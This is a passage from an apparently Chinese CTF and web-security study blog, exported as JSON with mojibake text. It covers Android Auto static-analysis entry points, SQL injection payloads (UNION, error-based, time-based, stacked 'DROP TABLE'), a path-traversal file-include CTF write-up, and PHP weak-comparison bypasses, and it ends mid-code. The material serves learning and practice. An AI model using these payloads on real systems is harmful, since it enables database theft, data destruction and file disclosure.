¡éªŒâ€ç­‰å¤åˆå®‰å…¨é—®é¢˜ã€‚\nå…¥å£ç‚¹çš„å®šä½é€»è¾‘ 1. é™æ€åˆ†æå…¥å£ç‚¹çš„æ™®éæ€§ä¸Androidç‰¹æ®Šæ€§\næ™®é€šJavaåº”ç”¨çš„å…¥å£ç‚¹ï¼šJuliaåº“ï¼ˆé€šç”¨é™æ€åˆ†æå·¥å…·ï¼‰ä»mainæ–¹æ³•å¼€å§‹åˆ†æï¼Œå› ä¸ºJavaç¨‹åºé€šå¸¸æœ‰æ˜ç¡®çš„ç¨‹åºå…¥å£ã€‚\nAndroidåº”ç”¨çš„å¤æ‚æ€§ï¼š\nâ€¢ Androidç¨‹åºé€šè¿‡äº‹ä»¶å¤„ç†å™¨ï¼ˆå¦‚Activityã€Serviceã€BroadcastReceiverç­‰ï¼‰å“åº”ç”¨æˆ·äº¤äº’æˆ–ç³»ç»Ÿäº‹ä»¶ï¼Œè¿™äº›å¤„ç†å™¨å¯èƒ½è¢«åå°„æœºåˆ¶åŠ¨æ€è°ƒç”¨ï¼Œæ— æ³•é€šè¿‡å•ä¸€å›ºå®šçš„å…¥å£ï¼ˆå¦‚mainæ–¹æ³•ï¼‰è¦†ç›–æ‰€æœ‰é€»è¾‘ã€‚\nâ€¢ å…³é”®ä¿¡æ¯åˆ†æ•£åœ¨AndroidManifest.xmlï¼ˆå£°æ˜ç»„ä»¶ï¼‰å’Œè¿è¡Œæ—¶å±•å¼€çš„XMLæ–‡ä»¶ï¼ˆå¦‚å¸ƒå±€æ–‡ä»¶å®šä¹‰çš„UIäº‹ä»¶ï¼‰ä¸­ï¼Œéœ€ç»“åˆä¸¤è€…ç¡®å®šå…¥å£ç‚¹ã€‚\nAndroid Autoçš„ç‰¹æ®Šéœ€æ±‚ï¼š\nâ€¢ èšç„¦åª’ä½“æµè§ˆï¼ˆéŸ³é¢‘æ’­æ”¾ï¼‰å’Œæ¶ˆæ¯æœåŠ¡ï¼ˆé€šä¿¡åŠŸèƒ½ï¼‰ï¼Œè¿™ä¸¤ç±»æ˜¯Android Autoçš„æ ¸å¿ƒåœºæ™¯ï¼Œéœ€ç²¾å‡†å®šä½ç›¸å…³ç»„ä»¶ä»¥é¿å…åˆ†æé—æ¼ã€‚\n2. å…¥å£ç‚¹å®šä½çš„å…·ä½“ç­–ç•¥\nï¼ˆ1ï¼‰åŸºäºæ¸…å•æ–‡ä»¶ï¼ˆAndroidManifest.xmlï¼‰çš„å…¨å±€æ‰«æ\næ‰€æœ‰Androidç»„ä»¶ï¼ˆActivityã€Serviceç­‰ï¼‰å¿…é¡»åœ¨æ¸…å•æ–‡ä»¶ä¸­å£°æ˜ï¼Œåˆ†æå™¨é¦–å…ˆè§£ææ¸…å•æ–‡ä»¶ï¼Œæå–ä»¥ä¸‹ä¿¡æ¯ï¼š\nMediaBrowseræœåŠ¡ï¼šæœç´¢å£°æ˜android.media.browse.MediaBrowserServiceæœåŠ¡çš„ç±»ï¼ˆå¦‚å›¾ä¸­â€œandroid.media.browse.MediaBrowserServiceâ€ï¼‰ã€‚\næ¶ˆæ¯æœåŠ¡ï¼šç­›é€‰ç»§æ‰¿è‡ªBroadcastReceiverçš„æ¥æ”¶å™¨ç±»ï¼ˆå› Android Autoè§„èŒƒè¦æ±‚æ¶ˆæ¯å‘é€/æ¥æ”¶ç±»å¿…é¡»æ‰©å±•æ­¤ç±»ï¼‰ã€‚\nï¼ˆ2ï¼‰è¿è¡Œæ—¶XMLæ–‡ä»¶çš„åŠ¨æ€è¡¥å……\nå¸ƒå±€æ–‡ä»¶ï¼ˆXMLï¼‰ä¸­å®šä¹‰çš„UIæ§ä»¶ï¼ˆå¦‚æŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼‰å¯èƒ½å…³è”äº‹ä»¶å¤„ç†å™¨ï¼Œéœ€è§£ææ­¤ç±»æ–‡ä»¶ä»¥è¡¥å……åå°„è°ƒç”¨æˆ–éšå¼æ³¨å†Œçš„å…¥å£ç‚¹ã€‚\nç¤ºä¾‹å›¾\næ¼æ´æ£€æµ‹çš„å·¥ä½œåŸç† å…·ä½“æµç¨‹ï¼š\nå¼€å§‹ï¼ˆSTARTï¼‰\næµç¨‹èµ·ç‚¹ï¼Œå‡†å¤‡å¯åŠ¨æ¼æ´æ£€æµ‹é€»è¾‘ã€‚\næœç´¢ä¸­é—´ä»£ç ï¼ˆSearch in the Intermediate Codeï¼‰\nç¬¬ä¸€æ­¥æ˜¯åœ¨ç¼–è¯‘åçš„ä¸­é—´ä»£ç ï¼ˆå¦‚Javaå­—èŠ‚ç ã€LLVM IRç­‰ï¼‰ä¸­æ‰«æï¼Œå¯»æ‰¾å¯èƒ½å­˜åœ¨æ¼æ´çš„ä»£ç ç‰‡æ®µï¼ˆå¦‚ä¸å®‰å…¨çš„å‡½æ•°è°ƒç”¨ã€æœªéªŒè¯çš„è¾“å…¥å¤„ç†ç­‰ï¼‰ã€‚\næ£€æµ‹æ¼æ´å®ç°ï¼ˆVulnerable implementation Detected?ï¼‰\nâ€¢ NOï¼šæœªæ£€æµ‹åˆ°æ¼æ´ï¼Œè¿”å›â€œæœç´¢ä¸­é—´ä»£ç â€æ­¥éª¤ï¼Œç»§ç»­æ‰«æå‰©ä½™ä»£ç ï¼ˆå½¢æˆå¾ªç¯ï¼Œç›´åˆ°éå†æ‰€æœ‰ä»£ç ï¼‰ã€‚\nâ€¢ YESï¼šæ£€æµ‹åˆ°æ½œåœ¨æ¼æ´å®ç°ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥åˆ†æã€‚\nè®¿é—®JVMå †æ ˆï¼ˆAccess JVM Stackï¼‰\nè·å–å½“å‰æ¼æ´ä»£ç åœ¨JVMè¿è¡Œæ—¶çš„è°ƒç”¨æ ˆä¿¡æ¯ï¼Œç”¨äºåˆ†æè°ƒç”¨ä¸Šä¸‹æ–‡ï¼ˆå¦‚è°ƒç”¨å‚æ•°ã€è°ƒç”¨é“¾è·¯å¾„ç­‰ï¼‰ã€‚\nåˆ¤æ–­è°ƒç”¨å‚æ•°ç±»å‹ï¼ˆCalled with constant arguments?ï¼‰\næ£€æŸ¥æ¼æ´å‡½æ•°æ˜¯å¦ä½¿ç”¨å¸¸é‡å‚æ•°è°ƒç”¨ï¼š\nâ€¢ YESï¼šæ¼æ´è§¦å‘æ¡ä»¶æ˜ç¡®ï¼ˆå‚æ•°å›ºå®šï¼‰ï¼Œå¯ç›´æ¥è¿›å…¥å¤„ç†æµç¨‹ã€‚\nâ€¢ NOï¼šå‚æ•°å¯èƒ½åŠ¨æ€å˜åŒ–ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥ã€å˜é‡ä¼ é€’ï¼‰ï¼Œéœ€è¿›ä¸€æ­¥åˆ†ææ‰€æœ‰å¯èƒ½çš„è°ƒç”¨åœºæ™¯ã€‚\nå¤„ç†å¹¶æŠ›å‡ºè­¦å‘Šï¼ˆProcess and Throw Warningï¼‰\nå½“æ¼æ´ä»¥å¸¸é‡å‚æ•°è°ƒç”¨æ—¶ï¼Œç›´æ¥ç”Ÿæˆè­¦å‘Šä¿¡æ¯ï¼ˆå¦‚æ¼æ´ç±»å‹ã€ä½ç½®ã€é£é™©ç­‰çº§ï¼‰ï¼Œè¾“å‡ºç»™å¼€å‘è€…æˆ–é›†æˆåˆ°å¼€å‘å·¥å…·ä¸­ã€‚\nè·å–æ‰€æœ‰è´¡çŒ®è€…ï¼ˆGet all Contributorsï¼‰\nè‹¥å‚æ•°éå›ºå®šå€¼ï¼Œéœ€æ”¶é›†æ‰€æœ‰å¯èƒ½å¯¼è‡´æ¼æ´çš„è°ƒç”¨è·¯å¾„æˆ–ä»£ç æ¨¡å—ï¼ˆâ€œè´¡çŒ®è€…â€å¯èƒ½æŒ‡ä»£è°ƒç”¨é“¾ä¸­çš„ç›¸å…³å‡½æ•°ã€ç±»æˆ–è¾“å…¥æºï¼‰ï¼Œä»¥ä¾¿å…¨é¢åˆ†æã€‚\næ£€æŸ¥æ¼æ´æ£€æŸ¥å®ŒæˆçŠ¶æ€ï¼ˆAll Possible Vulnerabilities Checked?ï¼‰\nâ€¢ YESï¼šæ‰€æœ‰å¯èƒ½çš„æ¼æ´åœºæ™¯å·²åˆ†æå®Œæ¯•ï¼Œæµç¨‹ç»“æŸã€‚\nâ€¢ NOï¼šå­˜åœ¨æœªè¦†ç›–çš„è°ƒç”¨è·¯å¾„æˆ–æ½œåœ¨æ¼æ´åœºæ™¯ï¼Œè¿”å›â€œè®¿é—®JVMå †æ ˆâ€æ­¥éª¤ï¼Œé‡æ–°åˆ†æå…¶ä»–å¯èƒ½çš„è°ƒç”¨ä¸Šä¸‹æ–‡ï¼ˆå½¢æˆå¾ªç¯ï¼Œç¡®ä¿å…¨é¢æ€§ï¼‰ã€‚\n","date":"2025-07-16T00:00:00Z","image":"https://example.com/p/android-auto/1234_hu_f32088272d531a3e.gif","permalink":"https://example.com/p/android-auto/","title":"Android auto"},{"content":"å¸¸ç”¨è¯­æ³• SELECT 1 SELECT åˆ—å1, åˆ—å2, ... FROM è¡¨å WHERE æ¡ä»¶ UNION 1 2 3 SELECT åˆ—å FROM è¡¨å UNION SELECT åˆ—å_1 FROM è¡¨å_1; ä½¿ç”¨ UNION çš„æ—¶å€™è¦æ³¨æ„ä¸¤ä¸ªè¡¨çš„åˆ—æ•°é‡å¿…é¡»ç›¸åŒ\nOrder by 1 2 3 4 # åœ¨SQLæ³¨å…¥ä¸­æˆ‘ä»¬å¸¸ç”¨å®ƒæ¥åˆ¤æ–­åˆ—æ•° SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# ä¸æŠ¥é”™ SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# ä¸æŠ¥é”™ SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# æŠ¥é”™ æŸ¥è¯¢åº“å\n1 2 3 4 5 6 1 union SELECT 1,schema_name FROM information_schema.schemata; # or 1 union SELECT schema_name,2 FROM information_schema.schemata; # æ³¨æ„è¿™é‡Œçš„ schema_name ä¸€å®šè¦æ”¾åœ¨ä¼šæ˜¾ç¤ºçš„åˆ—åä¸Šé¢ æ¯”å¦‚passwordä¸æ˜¾ç¤º ä½†æ˜¯usernameæ˜¾ç¤º é‚£ä¹ˆå°±ç”¨ç¬¬äºŒç§ã€‚ # æ­¤æ—¶åå°æ‰§è¡Œä¸º: SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata; æŸ¥è¯¢è¡¨å\n1 2 3 4 5 6 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database() # åŸç†åŒä¸Š # å¦‚æœè¦æŸ¥è¯¢å…¶ä»–æ•°æ®åº“ å¯ä»¥å†™ä¸º where table_schema=\u0026#39;databaseNAME\u0026#39; # åå°æ‰§è¡Œä¸ºï¼š SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database() æŸ¥è¯¢å­—æ®µå\n1 2 3 4 1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database() # åå°æ‰§è¡Œä¸ºï¼š SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database(); å¸¸ç”¨å‚æ•° user()ï¼šå½“å‰æ•°æ®åº“ç”¨æˆ· database()ï¼šå½“å‰æ•°æ®åº“å version()ï¼šå½“å‰ä½¿ç”¨çš„æ•°æ®åº“ç‰ˆæœ¬ @@datadirï¼šæ•°æ®åº“å­˜å‚¨æ•°æ®è·¯å¾„ concat()ï¼šè”åˆæ•°æ®ï¼Œç”¨äºè”åˆä¸¤æ¡æ•°æ®ç»“æœã€‚å¦‚ concat(username,0x3a,password) group_concat()ï¼šå’Œ concat() ç±»ä¼¼ï¼Œå¦‚ group_concat(DISTINCT+user,0x3a,password)ï¼Œç”¨äºæŠŠå¤šæ¡æ•°æ®ä¸€æ¬¡æ³¨å…¥å‡ºæ¥ concat_ws()ï¼šç”¨æ³•ç±»ä¼¼ hex() å’Œ unhex()ï¼šç”¨äº hex ç¼–ç è§£ç  ASCII()ï¼šè¿”å›å­—ç¬¦çš„ ASCII ç å€¼ CHAR()ï¼šæŠŠæ•´æ•°è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦ load_file()ï¼šä»¥æ–‡æœ¬æ–¹å¼è¯»å–æ–‡ä»¶ï¼Œåœ¨ Windows ä¸­ï¼Œè·¯å¾„è®¾ç½®ä¸º \\ select xxoo into outfile \u0026lsquo;è·¯å¾„\u0026rsquo;ï¼šæƒé™è¾ƒé«˜æ—¶å¯ç›´æ¥å†™æ–‡ä»¶ SUBSTR(): æˆªå–å­—ç¬¦ä¸²ä¸­çš„ä¸€éƒ¨åˆ†, SUBSTR(string, start, length) BENCHMARK(): é‡å¤æ‰§è¡ŒæŒ‡å®šè¯­å¥, BENCHMARK(count,expr) æ³¨å…¥ å­—ç¬¦ä¸²æ³¨å…¥\n1 SELECT * FROM users WHERE username=\u0026#39;-1\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; -- \u0026#39; AND password=\u0026#39;$password\u0026#39;; æ—¶é—´æ³¨å…¥\n1 SELECT * FROM users WHERE username=\u0026#39;admin\u0026#39; AND IF(condition,SLEEP(5),0) æŠ¥é”™æ³¨å…¥ updatexml() updatexml() æ˜¯ MySQL ä¸­çš„ä¸€ç§ XML å¤„ç†å‡½æ•°ï¼Œå®ƒç”¨äºæ›´æ–° XML æ ¼å¼çš„æ•° æ®ï¼Œå…¶æ ‡å‡†çš„ç”¨æ³•å¦‚ä¸‹ï¼š\n1 UPDATEXML(xml_target, xpath_expr, new_value) å…¶ä¸­ï¼Œxml_target æ˜¯è¦æ›´æ–°çš„ XML æ•°æ®ï¼Œxpath_expr æ˜¯è¦æ›´æ–°çš„èŠ‚ç‚¹è·¯ å¾„ï¼Œnew_value æ˜¯æ–°çš„èŠ‚ç‚¹å€¼ã€‚\nä½†æ˜¯è¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œå¦‚æœäºŒä¸ªå‚æ•°åŒ…å«ç‰¹æ®Šç¬¦å·æ—¶ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šç¬¬äºŒ ä¸ªå‚æ•°çš„å†…å®¹æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­\né‚£ä¹ˆé€šè¿‡è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬ç”¨ concat() å‡½æ•° å°†æŸ¥è¯¢è¯­å¥å’Œç‰¹æ®Šç¬¦å·æ‹¼æ¥ åœ¨ä¸€èµ·ï¼Œå°±å¯ä»¥å°†æŸ¥è¯¢ç»“æœæ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­\n1 SELECT username, password FROM users WHERE id = 1 and updatexml(1, concat(0x7e,version()), 3) ps: 0x7eï¼ˆASCII ä¸º ~ï¼‰\nä¸è¿‡è¦æ³¨æ„çš„æ˜¯ updatexml() çš„æŠ¥é”™é•¿åº¦å­˜åœ¨å­—ç¬¦é•¿åº¦é™åˆ¶ï¼Œç›®å‰æœ‰ä¸¤ ç§æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š\nlimit() 1 2 3 4 5 SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e, (select username from users limit 0,1)), 3); # ä¸æ–­æ”¹å˜limit NUM,1 çš„å€¼é€è¡Œè·å– substr() 1 2 3 4 5 SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e, substr( (select group_concat(username) from users), 1,31) ),3); æ‰§è¡Œç»“æœï¼š\n1 2 3 4 5 mysql\u0026gt; SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e, substr( (select group_concat(username) from users),1,31) ),3); 1105 - XPATH syntax error: \u0026#39;~admin,super,flag,null\u0026#39; extractvalue() extractvalue() æ˜¯ MySQL ä¸­çš„ä¸€ä¸ª XML å¤„ç†å‡½æ•°ï¼Œå®ƒç”¨äºä» XML æ ¼å¼çš„æ•°æ®ä¸­æå–æŒ‡å®šèŠ‚ç‚¹çš„å€¼ã€‚\n1 EXTRACTVALUE(xml_target, xpath_expr) å…¶ä¸­ï¼Œxml_target æ˜¯è¦æå–èŠ‚ç‚¹å€¼çš„ XML æ•°æ®ï¼Œxpath_expr æ˜¯è¦æå–çš„èŠ‚ç‚¹è·¯å¾„ã€‚\nå®ƒç”¨äºæŠ¥é”™æ³¨å…¥çš„æ–¹æ³•å…¶å®å’Œ updatexml() å‡½æ•°çš„ä½¿ç”¨æ–¹æ³•å·®ä¸å¤š ä½†æ˜¯å‚æ•°å°‘ä¸€ä¸ª x\nå †å æ³¨å…¥ é€šè¿‡åœ¨ SQL è¯­å¥ä¸­ä½¿ç”¨åˆ†å·ï¼ˆ;ï¼‰æ¥åˆ†éš”å¤šä¸ª SQL è¯­å¥ï¼Œä»è€Œå®ç°å †å æ³¨å…¥æ”»å‡»ã€‚\n1 SELECT username, password FROM users WHERE id =1; DROP TABLE users;-- å‚è€ƒæ–‡çŒ®:SQL æ³¨å…¥\n","date":"2025-05-13T00:00:00Z","permalink":"https://example.com/p/sql%E6%B3%A8%E5%85%A5/","title":"SQLæ³¨å…¥"},{"content":"[HCTF 2018]WarmUp1(php) ä¸€é“phpç»•è¿‡çš„é¢˜ç›®ï¼Œæ¯”è¾ƒåƒä»£ç å®¡è®¡ï¼ˆå¯¹æˆ‘æ¥è¯´â‰¡(â–”ï¹â–”)â‰¡ï¼‰\nè¿›å…¥ç½‘é¡µï¼ŒF12å‘ç°æœ‰ä¸ªsource.php\nç‚¹è¿›å»ä¸€ä¸²phpä»£ç ï¼Œè¿™é‡Œç›´æ¥ç»™ä¸Šæ³¨é‡Š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 \u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; //ç™½åå• if (! isset($page) || !is_string($page)) { //ç©ºå‚çš„è¯å°±è¿”å›false echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { //åˆ¤æ–­æ˜¯å¦åœ¨ç™½åå• return true; } $_page = mb_substr( //æˆªå–ç½‘å€0åˆ°?çš„éƒ¨åˆ† $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); //è§£ç ä¸€æ¬¡ $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } ?\u0026gt; æ ¹æ®ä»£ç æƒ³è¦å¾—åˆ°flagå‚æ•°å°±è¦æ»¡è¶³éç©ºï¼Œå­—ç¬¦ä¸²ï¼Œå’ŒcheckFileï¼Œå‰é¢ä¸¤ä¸ªå¤©ç„¶æ»¡è¶³\nè¿™é‡Œæ³¨æ„åˆ°è¿˜æœ‰ä¸€ä¸ªhint.php,è®¿é—®ä¸€ä¸‹\nå¾—åˆ°è¿™æ ·ä¸€å¥è¯\né‚£ä¹ˆå¯ä»¥ç¡®å®šflagåœ¨/ffffllllaaaaggggç›®å½•ä¸‹\næ ¹æ®ä»£ç ç¬¬ä¸€ä¸ªåˆ¤æ–­æ˜¯ä¸æ»¡è¶³çš„ï¼Œé‚£æˆ‘ä»¬è¯•è¯•ç¬¬äºŒä¸ªï¼Œè¯•äº†ä¸€ä¸‹ ?file=source.php?/ffffllllaaaagggg ï¼Œæ²¡æœ‰ç»“æœï¼ŒçŒœæµ‹åœ¨å­ç›®å½•ä¸‹\nåˆè¯•äº†è¯• ?file=source.php?/../../../../ffffllllaaaagggg\næˆåŠŸäº†\nçœ‹èµ·æ¥ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªåˆ¤æ–­éƒ½æ˜¯å¹²æ‰°é¡¹\nåŸé¢˜\n","date":"2025-05-08T00:00:00Z","image":"https://example.com/p/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84wp/duitang_1747369962671_hu_edefd0ca7e60c4bf.gif","permalink":"https://example.com/p/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E7%9A%84wp/","title":"ä¸€äº›é¢˜ç›®çš„wp"},{"content":"åŸºç¡€é¡¹ æ¯”è¾ƒ\n== åªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹\n=== é™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹\n0 == false: bool(true)\r0 === false: bool(false)\rps:åœ¨phpä¸­ \u0026quot;å­—ç¬¦ä¸²\u0026quot;==0 æ˜¯æˆç«‹çš„\nè¾“å‡º\necho - å¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²\nprint- åªå…è®¸è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›å€¼æ€»ä¸º 1\næ•°ç»„\narray() å‡½æ•°ç”¨äºåˆ›å»ºæ•°ç»„\n1 2 3 4 \u0026lt;?php $cars=array(\u0026#34;Hello\u0026#34;,\u0026#34;CTF\u0026#34;); echo \u0026#34;I like \u0026#34; . $cars[0] . \u0026#34; \u0026#34; . $cars[1] . \u0026#34;.\u0026#34;; ?\u0026gt; é­”æœ¯å¸¸é‡\nè¡Œå¦‚ __FILE__ è¿™æ ·çš„ __XXX__ é¢„å®šä¹‰å¸¸é‡ï¼Œè¢«ç§°ä¸ºé­”æœ¯å¸¸é‡ã€‚\n1 2 __FILE__ //è¿”å›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶å highlight_file(__FILE__); //ä»£ç é«˜äº®çš„æ˜¾ç¤ºå½“å‰æ–‡ä»¶å†…å®¹ è¡¨å•æ•°æ®\n$_GET â€”â€” æ¥å— GET è¯·æ±‚ä¼ é€’çš„å‚æ•°ã€‚\nç¤ºä¾‹: example.com/index.php?book=HELLOCTFï¼Œä½ å¯ä»¥ä½¿ç”¨ $_GET['book'] æ¥è·å–ç›¸åº”çš„å€¼ã€‚\n$_POST â€”â€” æ¥å— POST è¯·æ±‚ä¼ é€’çš„å‚æ•°ã€‚\nç¤ºä¾‹ï¼šå¯¹ example.com/index.php è¿›è¡Œ POST ä¼ å‚ï¼Œå‚æ•°åä¸º book å†…å®¹ä¸º HelloCTFï¼Œä½ å¯ä»¥ä½¿ç”¨ $_POST['book'] æ¥è·å–ç›¸åº”çš„å€¼ã€‚\n$_REQUEST â€”â€” æ¥å— GET å’Œ POST ä»¥åŠ Cookie è¯·æ±‚ä¼ é€’çš„å‚æ•°ã€‚ ç¤ºä¾‹ï¼š\nå¦‚æœä½ é€šè¿‡ URL ä¼ é€’äº†ä¸€ä¸ªå‚æ•° example.com/index.php?key=value_from_getï¼Œä½ å¯ä»¥é€šè¿‡$_REQUEST['key'] è·å–è¿™ä¸ªå€¼ã€‚\nå¦‚æœä½ é€šè¿‡ POST æ–¹æ³•æäº¤äº†ä¸€ä¸ªè¡¨å•ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªåä¸º key çš„å­—æ®µä¸”å…¶å€¼ä¸ºvalue_from_postï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡ $_REQUEST['key'] è·å–è¿™ä¸ªå€¼ã€‚\nåŒæ—¶ï¼Œå¦‚æœä½ è®¾ç½®äº†ä¸€ä¸ªåä¸º key çš„ cookieï¼Œå…¶å€¼ä¸º value_from_cookieï¼Œä½ è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ $_REQUEST[\u0026lsquo;key\u0026rsquo;] æ¥è·å–è¿™ä¸ªå€¼ã€‚\næ‡’äººå¿…å¤‡^o^/\nå‡½æ•°\nä¸€èˆ¬æ¥è¯´åå­—â‰ˆåŠŸèƒ½ï¼Œæ‰€ä»¥ç†è§£å¤§äºè®°å¿†ï¼Œåˆ—å‡ ä¸ªå¸¸è§çš„\nassert() : ç”¨äºè°ƒè¯•ï¼Œæ£€æŸ¥ä¸€ä¸ªæ¡ä»¶æ˜¯å¦ä¸º trueã€‚\nunserialize() : å°†ä¸€ä¸ªå·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è½¬æ¢å› PHP çš„å€¼ã€‚ä¾‹å¦‚: $array = unserialize($serializedStr) å¯ä»¥å°†ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°ç»„å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°ç»„ã€‚\nmysql_query(): å‘é€ä¸€ä¸ª MySQL æŸ¥è¯¢ã€‚\nå‡½æ•°å®‰å…¨ å¸¸è§ç»•è¿‡\n1 2 3 4 5 6 7 \u0026lt;?php $a = $_GET[\u0026#39;a\u0026#39;]; if (is_numeric($a)) { exit(); } elseif ($a == 404) { echo \u0026#34;flag\u0026#34;; } æƒ³è¦ç»•è¿‡å¯ä»¥åœ¨æ•°å­—å‰é¢æˆ–è€…åé¢åŠ ä¸Š %0a %0b %0c %0d %09\nä¾‹å¦‚: ?a=\u0026quot;404%0a\u0026quot;\nå¼±ç±»å‹æ¯”è¾ƒ\nstrcmp()\nå½“ strcmp æ¯”è¾ƒå‡ºé”™åï¼Œä¼šè¿”å› nullï¼Œnull åˆ™ä¸º 0 ã€‚\n1 2 3 4 5 6 $flag = \u0026#39;flag{123}\u0026#39;; if (strcmp($flag, $_GET[\u0026#39;str\u0026#39;]) == 0) { echo $flag; }else{ echo \u0026#34;Out!\u0026#34;; } ä¸ºäº†ä½¿ strcmp æ¯”è¾ƒå‡ºé”™ï¼Œå¯ä»¥ä¼ å…¥ä¸€ä¸ªæ•°ç»„\nPayload: ?str[]\nis_switch()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $a = \u0026#34;233a\u0026#34;; $flag = \u0026#34;flag{Give you FLAG}\u0026#34;; switch ($a) { case 1: echo \u0026#34;No Flag\u0026#34;; break; case 2: echo \u0026#34;No Flag\u0026#34;; break; case 233: echo $flag; break; default: $a = 233; echo \u0026#34;Haha...\u0026#34;; } case ä¼šè‡ªåŠ¨å°†å­—ç¬¦è½¬æ¢æˆæ•°å€¼,å³é‡åˆ°éæ•°å­—å°±åœæ­¢\nmd5()\nmd5 åœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå¦‚æœ md5 ç¼–ç åçš„å“ˆå¸Œå€¼æ—¶ 0e ï¼ˆç§‘å­¦è®¡æ•°æ³•ï¼‰å¼€å¤´çš„ï¼Œéƒ½ä¸€å¾‹è§£é‡Šä¸º 0\nä¾‹å¦‚:\n1 2 3 4 5 6 7 8 $flag = \u0026#34;flag{THIS_IS_REAL_FLAG}\u0026#34;; $v1 = $_GET[\u0026#39;gat\u0026#39;]; $v2 = $_GET[\u0026#39;tag\u0026#39;]; if ($v1 != $v2 \u0026amp;\u0026amp; md5($v1) == md5($v2)) { echo $flag; }else{ echo \u0026#34;Out!\u0026#34;; } æ­¤æ—¶æ‰¾åˆ°ä¸¤ä¸ªä¸ç›¸åŒä½†md5ç¼–ç åä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²å³å¯\nå¦‚æœæ˜¯è¿™æ ·:\n1 2 3 4 5 6 $flag = \u0026#34;flag{THIS_IS_REAL_FLAG}\u0026#34;; $str1 = $_GET[\u0026#39;gat\u0026#39;]; $str2 = $_GET[\u0026#39;tag\u0026#39;]; if (md5($str1) === md5($str2)) { echo $flag; } ç”¨ä¸Šè¿° 0e æ–¹æ³•è‡ªç„¶æ˜¯ä¸å¯è¡Œçš„ï¼ˆæ³¨æ„ï¼š=== ï¼‰ï¼Œè¿™æ—¶å€™å°±å¾—ä½¿ç”¨æ•°ç»„æ¥ç»•è¿‡äº†ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªæ•°ç»„çš„å€¼ï¼Œä¼šæŠ¥å‡ºé”™è¯¯ï¼ˆmd5 åªèƒ½ä½¿ç”¨å­—ç¬¦ä¸²ï¼‰ï¼ŒæŠ¥é”™åå°±ç›¸å½“äºç»•è¿‡ === è¿™ä¸ªæ¡ä»¶äº†\næ³¨: åœ¨ PHP 8.0.0 æ—¶ï¼Œè¯¥æ–¹æ³•è¡Œä¸é€šäº†\nå¦‚æœé‡åˆ°ä¸èƒ½ä¼ å…¥æ•°ç»„ï¼Œåªèƒ½ä¼ å…¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå¦‚ä¸‹ä¾‹\n1 2 3 4 5 6 7 8 $flag = 